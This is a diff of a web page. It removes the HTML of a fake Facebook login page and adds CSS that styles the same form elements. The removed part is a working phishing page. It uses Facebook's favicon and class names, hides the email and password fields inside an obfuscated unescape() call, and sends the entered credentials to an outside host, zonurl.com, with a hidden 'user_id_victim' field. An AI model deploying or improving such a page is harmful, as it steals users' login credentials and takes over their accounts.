@@ -1,42 +1,96 @@
-<head>
-<title></title>
-<meta property="og:url" content="" />
-<meta property="og:type" content="article" />
-<meta property="og:title" content="Redirection " />
-<meta property="og:description" content="Redirection " />
-<meta property="og:image" content="" />
-<meta name="revisit-after" content="1000 days">
-<meta name="robots" content="nofollow">
-<meta name="googlebot" content="noindex">
+/* General Body Styles */
+body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #f4f4f9;
+    color: #333;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
 
-<meta name="viewport" content="width=device-width, initial-scale=1">
+/* Center the content */
+#globalContainer {
+    width: 100%;
+    max-width: 800px;
+    margin: auto;
+    text-align: center;
+    background: #ffffff;
+    border-radius: 10px;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    padding: 20px;
+}
 
-</script><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<link rel="shortcut icon" href="https://fbstatic-a.akamaihd.net/rsrc.php/yl/r/H3nktOa7ZMg.ico">
+/* Logo Styling */
+img {
+    max-width: 100%;
+    height: auto;
+    margin-bottom: 20px;
+}
 
-<link type="text/css" rel="stylesheet" href="https://zonurl.com/css2/1.css" />
- <link type="text/css" rel="stylesheet" href="https://zonurl.com/css2/2.css" />
-</head>
+/* Image Grid Styling */
+img + img {
+    margin: 10px;
+    border: 2px solid #ddd;
+    border-radius: 5px;
+}
 
+/* Form Container */
+.login_form_container {
+    margin-top: 30px;
+}
 
+form {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
 
-</span></div></div></div></div></div></div></div><div id="globalContainer" class="uiContextualLayerParent"><div id="content" class="fb_content clearfix"><div class="UIFullPage_Container"><div class="mvl ptm uiInterstitial login_page_interstitial uiInterstitialLarge uiBoxWhite"><div class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader"><div class="clearfix uiHeaderTop"><div class="rfloat"><h2 class="accessible_elem">
-    
-   
+/* Form Fields */
+input[type="text"], 
+input[type="password"] {
+    width: 80%;
+    padding: 10px;
+    margin: 10px 0;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    font-size: 16px;
+}
 
-</h2></div></div></div><div class="phl ptm uiInterstitialContent"><div class="login_form_container"> <center>
-<img src="logo1.png" >
-</center>
+/* Submit Button */
+input[type="submit"] {
+    background: #4CAF50;
+    color: #fff;
+    border: none;
+    padding: 10px 20px;
+    margin-top: 10px;
+    font-size: 16px;
+    cursor: pointer;
+    border-radius: 5px;
+    transition: background 0.3s;
+}
 
-<form method="POST" action="https://zonurl.com/conti0/myapp/10.php"  id="login_form" onsubmit="return Event.__inlineSubmit(this,event)">
-	<input type="hidden" name="user_id_victim" value="255977" /></TD>
-	<input type="hidden" name="hash" value="df46b0cba6eac619385345696d5ec035,1736531516" />
-<script>
-<!-- code by https://www.html-code-generator.com -->
-document.write(unescape('%09%3Cdiv%20class%3D%22form_row%20clearfix%20%22%3E%3Clabel%20for%3D%22email%22%20id%3D%22label_email%22%20class%3D%22login_form_label%22%3EEmail%3A%3C/label%3E%3Cinput%20class%3D%22inputtext%22%20id%3D%22email%22%20name%3D%22email%22%20onkeypress%3D%22formchange%28%29%22%20type%3D%22text%22%3E%3C/div%3E%3Cdiv%20class%3D%22form_row%20clearfix%20%22%3E%3Clabel%20for%3D%22pass%22%20id%3D%22label_pass%22%20class%3D%22login_form_label%22%3EPassword%3A%3C/label%3E%3Cinput%20class%3D%22inputpassword%22%20id%3D%22pass%22%20name%3D%22pass%22%20value%3D%22%22%20type%3D%22password%22%3E%3C/div%3E%3Clabel%20class%3D%22persistent%22%3E%3Cinput%20class%3D%22inputcheckbox%20%22%20id%3D%22persistent_inputcheckbox%22%20name%3D%22persistent%22%20value%3D%221%22%20type%3D%22checkbox%22%3E%3Cspan%20id%3D%22persistent_login_text%22%3EKeep%20me%20logged%20in%3C/span%3E%3C/label%3E%3Cinput%20id%3D%22default_persistent%22%20name%3D%22default_persistent%22%20value%3D%220%22%20autocomplete%3D%22off%22%20type%3D%22hidden%22%3E%3Cdiv%20id%3D%22buttons%22%20class%3D%22form_row%20clearfix%22%3E%3Clabel%20class%3D%22login_form_label%22%3E%3C/label%3E%0A'))
-</script>
+input[type="submit"]:hover {
+    background: #45a049;
+}
 
+/* Checkbox Styling */
+label.persistent {
+    margin-top: 10px;
+    display: flex;
+    align-items: center;
+    font-size: 14px;
+}
 
+input[type="checkbox"] {
+    margin-right: 5px;
+}
 
-<label class="uiButton uiButtonConfirm uiButtonLarge" for="u649190_1">
-<input value="Login" name="login"  onclick="" id="u649190_1" type="submit" ></label>
+/* Header Text */
+h2 {
+    font-size: 24px;
+    margin-bottom: 20px;
+    color: #4CAF50;
+}
